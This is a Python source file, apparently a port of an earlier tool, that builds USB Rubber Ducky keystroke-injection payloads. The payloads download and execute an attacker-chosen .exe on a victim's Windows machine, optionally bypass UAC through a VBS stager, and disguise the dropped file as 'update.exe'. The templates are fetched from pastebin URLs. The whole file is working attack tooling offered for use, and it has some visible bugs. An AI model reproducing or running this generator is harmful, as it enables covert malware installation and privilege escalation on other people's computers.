###############################################################################
#
# Original creator of ducky script file : Skidde
# Creator of DuckyScript 3.0: Egbie
# Author : Egbie
# Version DuckyScript 3.0
# Written in Python 3
# Works only in python 3.x
#
# I WOULD LIKE TO BEGIN BY GIVE A SHOUT OUT TO SKIDDIE THE ORIGINAL
# CREATOR OF UAC-DUCK GENERATOR SCRIPT. MY WORK IS BASED OFF SKIDDIE
# SCRIPT WHICH IS IMPLEMENTED IN PYTHON 2.X. AND WITHOUT HIS WORK IT
# WOULD NOT HAVE BEEN POSSIBLE FOR ME TO CREATE THIS VERSION.
#
# HIS ORIGINAL SCRIPT CAN BE FOUND AT HIS GITHUB ACCOUNT LOCATED BELOW.
# HTTPS://GITHUB.COM/SKIDDIETECH/UAC-D-E-RUBBER-DUCKY/BLOB/MASTER/UAC-DUCK.PY
#
# I HAVED USED HIS WORK AND RE-WRITTEN IT SO THAT IT CAN NOW BE RUN FOR
# THOSE OF US WHO HAVE PYTHON 3.X.
#
# I WAS ABLE TO TEST CHOICES 1 AND 2 BUT WAS NOT ABLE TO TEST
# CHOICES 3 AND 4 AS THEY REQUIRE A RUBBER DUCKY AND I NO LONGER HAVE A
# RUBBER DUCKY.
#
# WELCOME TO THE MAD HOUSE AND LET THE MADNESS BEGIN..
##############################################################################

import sys
import urllib
from urllib.request import urlopen
from time import sleep
from os.path import exists
from os import remove, system

WINDOW_SCRIPT_URL = "http://pastebin.com/raw/8nYdas2y"
PAYLOAD_VBS_URL   = "http://pastebin.com/raw/GBZZsPEe"
POWERSHELL_STAGER_URL = "http://pastebin.com/raw/mXLM5hrC"
DUCKY_URL = "http://github.com/hak5darren/USB-Rubber-Ducky/raw/master/duckencoder.jar"
DUCKY_PAYLOAD_URL = "http://pastebin.com/raw/apyPSqWs"

def gen_bin_script(lang=None):
    """run_shell_command(str) -> return(None)

    When invoked runs a system command that creates
    a ducky script inject.bin file.
    """

    sleep(1)
    COMMAND = "java -jar Duckencoder.jar -i DuckyScript.txt -o inject.bin"
    if lang:
        system("{} -l {}".format(COMMAND, lang))
    else:
        system("{}".format(COMMAND))

def check_file_ext(f, ext):
    """check_file_ext(str, str) -> return(bool)

    Checks if a given file matches a given extenstion.
    Returns True if the file matches the extenstion
    otherwise returns False.

    :parameter
       -  f : The file that would be used to check.
       - ext: Checks the given file against this extenstion.

    >>> check_file_ext('evil_plans.txt', '.txt')
    True
    >>> check_file_ext('plans.txt.', '.exe')
    False
    """
    return f.lower().endswith(ext)

def clear_pre_existing_files():
    """Removes any pre-existing files from the users directory."""

    files = ['DuckyScript.txt', 'UAC-Duck-Payload.vbs', 'inject.bin']
    for f in files:
        if exists(f):
            remove(f)

def download_file(url, string=True):
    """download_file(str, bool(optional)) -> return(str)

    Downloads a file from a given url. If an error occurrs
    while downloading an exception is raised.

    :parameter
        - url    :The url containing the data to download from.
        - string :The urlopen module default mode for storing
                  downloaded data is bytes and not as strings.

                  The is where string flag comes in. When the
                  flag is set to True it tells method to go
                  ahead and decode the data into utf-8 because
                  the data we are expecting is in the form of
                  strings.

                  If the string flag is set to False it
                  ells the method not to decode into utf-8
                  because the data downloaded is not a string.
    """
    try:
        data = urlopen(url).read()
        return data.decode('utf-8') if string else data
    except urllib.error.URLError:
        sys.exit("[-] The file could not be downloaded, please check url!!!")

def replace_value(string, old, new):
    """replace_value(str, str, str) -> return(str)

    Takes a string and replaces the old values with the new ones.
    Returns a new string with the replace values.

    :parameters
       - string: The string containing the elemnts that would be replaced.
       -    old: The values located within the string that will be replaced.
       -    new: The new value will replace the old values.
    """
    return string.replace(old, new)

def save(string, file_name, flag='a'):
    """save(str, str, str(optional)) -> return(None)

    Takes a string and saves it to a file. If the flag 'a'
    is set and file exist the data is added to end of the file.
    If file does not exist then a new file is created and the
    data stored.

    :parameter
        - file_name: The name of the file the data would be saved to.
        -     flags: Takes three optional flags 'a', 'wb', 'w'.
                     flag 'a'  : appends data to an existing file. Default mode.
                     flag 'wb' : writes data to a file in binary format.
    """
    with open(file_name, flag) as user_file:
        user_file.write(string)

def _gen_script(url, name_type, payload_url, name, executable_name, file_name):
    """_gen_script(str, str, str, str, str,) -> return(None)

    A thin wrapper function that does most of the heavy lifting for
    the functions 'gen_vbs_script' and 'gen_payload_duckyscript'.

    The function generates either a duckyscript or a vbs script
    and saves it to the user hard drive. The script generated
    depends on whatever function calls it.

    :parameter
      - url: The url to download the data from.
      - name_type: The types to write to the file.
                  Classified by three types: '[URL]', '[NAME]' and '[DRIVENAME]'

      - payload_url: The url containing the payload.
      - name: The name to save the payload once downloaded.
      - executable_name: The name given to executable on the target machine.
      - file_name: Then name to save the file on the users hard drive.
    """

    if payload_url:
        script = replace_value(download_file(url), name_type, payload_url)
        save(replace_value(script, name, executable_name), file_name)
    else:
        script = replace_value(download_file(url), name_type, name)
        save(script, file_name)

def gen_vbs_script(url, name_type, payload_url, name, executable_name):
    """gen_vbs_script(str, str, str, str) -> return(None)

    Generates a vbs script.
    :parameter
        - url: The url to download the data from.
        - name_type: The types to write to the file.
                     Classified by three types: '[URL]', '[NAME]' and '[DRIVENAME]'

       - payload_url: The url containing the payload.
       - executable_name: The name given to executable on the target machine
    """
    if not executable_name.endswith('.exe'):
        executable_name = 'update.exe'
    if payload_url:
        _gen_script(url, name_type, payload_url, name, executable_name, 'UAC-Duck-Payload.vbs')
    else:
        _gen_script(url, name_type, name=name, file_name=file_name)
    print("\n[+] Payload UAC-Duck-Payload.vbs generated!")

def gen_payload_duckyscript(url, name_type, payload_url, name, executable_name):
    """gen_payload_duckyscript(str, str, str, str) -> return(None)

    Generates a ducky payload script.

    :parameter
        - url: The url to download the data from.
        - name_type: The types to write to the file.
                     Classified by three types: '[URL]', '[NAME]' and '[DRIVENAME]'

       - payload_url: The url containing the payload.
       - executable_name: The name given to executable on the target machine
    """
    _gen_script(url, name_type, payload_url, name, executable_name, 'DuckyScript.txt')
    print('\n[+] Payload DuckyScript.txt generated!!')

def ducky_encode(lang='GB'):
    """ducky_encode(str) -> return(None)

    The ducky_encode encodes the script as an inject.bin file.
    If the language parameter is set to True then the script is
    encoded into that language else it is encoded as GB English.

    :parmeter:
       - lang: Language to encode into the script.
    """
    if not exists('Duckencoder.jar'):
        print('\n[-] duckencoder.jar file was not found, beginning download please wait...')
        ducky_downloader()
        if exists('Duckencoder.jar'): # check if the file exists after download.
            print('[+] Successfully downloaded the duckencoder.jar file to local hard drive..')
        else:
            print('[-] Failed to create bin file because download was unsuccessful!!')
            print('[+] Try manually downloading the file and then try again.')
            return False

    print('[+] Please wait, the text will now be encoded into an inject.bin file ..')
    gen_bin_script(lang)

    if exists('inject.bin'):
        print("\n[+] Successfully encoded script with the language {}.".format(lang))
    else:
        print('\n[-] Failed to encode duckyscript.txt using language mode.')
        while True:
            ans = input('[+] Would you like to encode the duckyscript file without a language: (y/n) : ')
            if ans[0].lower() == 'n':
                return
            elif ans[0].lower() == 'y':

                print('[+] Beginning process please wait...')
                gen_bin_script(None) # run command without language

                if exists('inject.bin'):
                    print("[+] Successfully encoded script.")
                    break

    print('[+] There is now an inject.bin file in your local directoy.')

def ducky_downloader():
    """ducky_downloader(None) -> return(None)

    Downloads a ducky file and saves it to the user local drive.
    """
    save(download_file(DUCKY_URL, False),'Duckencoder.jar', 'wb')

def generate_script(online_version, uac_bypass, **kw):
    """generate_script(str, str, kw) -> return(None)

    A thin wrap function that works by checking whether
    the binary script url is either the online or
    offline version. As well as whether to implement
    the script with either a UAC bypass or not.

    :parmaters:
       -online_version:  Takes either a True or False.
                         True means use the online version
                         and False the offline version.

        - uac_bypass:    Can be set to either True of False.
                         When set to True the UAC bypass
                         is implemented. And when set to
                         False the UAC bypass is not implemented.

        kw(keyword arguments)
           - payload_url : The is the url containing the payload.
           - payload_name: The name associated witht the payload.
           - stager_name : The name to associated with the
                            UAC VBS script.
           - drive_name  : The drive pointing to the rubber ducky.
    """

    if online_version and not uac_bypass: # online version without UAC bypass
        gen_payload_duckyscript(WINDOW_SCRIPT_URL,"[URL]",
                                kw["payload_url"],
                                "[NAME]",
                                kw["executable_name"])

    elif online_version and uac_bypass: #  online version with UAC bypass
        gen_vbs_script(DUCKY_PAYLOAD_URL,"[URL]",
                       kw["uac_payload_url"],
                       "[NAME]",
                       kw["payload_name"])

        gen_payload_duckyscript(WINDOW_SCRIPT_URL,"[URL]",
                                kw["uac_payload_url"],
                                "[NAME]",
                                kw["uac_vbs_name"])

    elif not online_version and not uac_bypass: # offline version without UAC bypass
        gen_payload_duckyscript(POWERSHELL_STAGER_URL,'[DRIVENAME]',
                                kw["drive_name"],'[NAME]',
                                kw["payload_name"] )

        print("[+] Place your {} on your rubber ducky and rename.".format(kw["payload_name"]))

    elif not online_version and uac_bypass: # offline version with UAC bypass

        print("""
        [+] Two stages will be implemented..
        [+] First a VBS stager would be generated...
        [+] Second a ducky payload ducky script would be generated..""")

        # creates a vbs stager.
        gen_vbs_script(PAYLOAD_VBS_URL,'[NAME]',
                       name=kw['payload_name'],
                       executable_name=kw['stager_name'])

        # create a ducky script
        gen_payload_duckyscript(POWERSHELL_STAGER_URL,'[NAME]',
                                kw['stager_name'],'[DRIVENAME]',
                                kw['drive_name'])

        print("\n[+] VBS Stager {} + generated!!".format(kw['stager_name']))
        print("[+] Payload DuckyScript.txt generated!!")
        print("[+] Place the {} file and your {} on your rubber ducky ".format(kw['stager_name'],
                                                                               kw['payload_name']))
        sleep(1)
        print("[+] with drivename {} drive".format(kw['drive_name']))

def menu():
    """The menu for the script."""

    print("""\n\n

      _   _  _   ___   ___  _   _  ___ _  __
     | | | |/_\ / __| |   \| | | |/ __| |/ /
     | |_| / _ \ (__  | |) | |_| | (__| ' <
      \___/_/ \_\___| |___/ \___/ \___|_|\_\

        \n\n
        Orignal creator of UAC-Duck Skiddie.
        Creator of UAC-DUCK 3.0 Egbie

    [+++++++++++++++++++++++++++++++++++++++]

    I would like to begin by give a shout out to Skiddie the original
    creator of UAC-Duck generator script. My work is based off Skiddie
    script which is implemented in python 2.x. And without his work it
    would not have been possible to create this.

    His original script can be found at his github account located below.
    https://github.com/SkiddieTech/UAC-D-E-Rubber-Ducky/blob/master/uac-duck.py

    I haved used his work and re-written it so that it can now be run for

    those of us who have python 3.x.

    Welcome to the mad house..

    -------------ONLINE-VERSION-------------------

    [1] Generate binary download and execute ducky script without UAC bypass.
    [2] Generate binary download and execute ducky script with UAC bypass.

    -------------OFFLINE-VERSION-------------------

    [3] Generate binary download & execute ducky script without UAC bypass.
    [4] Generate binary download & execute ducky script with UAC bypass.
    [5] Exit

    """)

    while True:
        choice = input('[+] Enter a number between (1-5) : ')
        if choice.isdigit():
            choice = int(choice)
            if 1 <= choice <= 5:
                 return choice

# the main program.
def main():

    if choice == 1 or choice == 2:
        while True:
            binary_payload_url = input('[+] Please enter your binary payload direct link URL(www.example.com/pay.exe): ')
            if check_file_ext(binary_payload_url, '.exe'):
                break

        print("\n[+] Enter a NAME to save your executable payload file as (Default: update.exe): ")
        executable_name = input('[+] This will be stored on the target machine: ')
        executable_name = 'update.exe' if not check_file_ext(executable_name, '.exe') else executable_name

        # choice 1 generates only a ducky script.
        if choice == 1:
            generate_script(True, False,
                           payload_url=binary_payload_url.lower(),
                           executable_name=executable_name.lower())

    # choices 2 generates a ducky script and VBS script.
    if choice == 2:

        print("[+] Please UPLOAD this .vbs file as raw text format to a webserver(Pastebin works great).")
        print('[+] Pastebin/RAW recommended Example http://pastebin.com/raw/VBSPAYLOAD).')
        print('[+] Please now enter your UAC VBS Payload URL you used for upload.\n')

        uac_payload_url = input("ONLINE VERSION with UAC BYPASS >>> ")
        uac_vbs_name = input('\n[+] Now enter a NAME to save the UAC VBS Payload file as. The default name is(update.vbs : ')

        generate_script(True, True, payload_url=binary_payload_url, payload_name=executable_name,
                        uac_payload_url=uac_payload_url, uac_vbs_name=uac_vbs_name.lower())

    elif choice == 3 or choice == 4:

        while True:
            payload_name = input("[+] Enter your binary payload name located on the drive e.g/ update.exe: ")
            if check_file_ext(payload_name, '.exe'):
                break

        drive_name = input("[+] Please input your Twin-Duck drive name e.g. backup. : ")
        msg = "[OFFLINE] Ducky D&E Blazing fast payload (Without UAC bypass) "
        if choice == 3:
            print(msg)
            generate_script(False, False, drive_name=drive_name, payload_name=payload_name)
        elif choice == 4:

            print(replace_value(msg, '(Without UAC bypass)', '(With UAC bypass)' ))
            while True:
                stager_name = input("Please input your desired UAC VBS local file name(Example: update.vbs): ")
                if check_file_ext(stager_name, '.vbs'):
                    break

            generate_script(False, False, payload_name=payload_name,
                            stager_name=stager_name, drive_name=drive_name)

    elif choice == 5:
        sys.exit('[+] Thanks, for using ducky automation good bye!!!')

    while True:
        ans = input('[+] Would you like to encode your DuckyScript.txt into an inject bin file ("y/n/yes/no"): ')
        if ans[0].lower() == 'y':

            ans = input('[+] Enter a language to encode the script with. Default GB: ')
            print('[+] Encoding DuckyScript.txt as inject bin file please wait...')
            ducky_encode()
            break
        elif ans[0].lower() == 'n':
           break

    sys.exit('[+] Your payload has been generated. This screen will now exit bye.\n')

if __name__ == '__main__':
    clear_pre_existing_files()
    choice = menu()
    main()
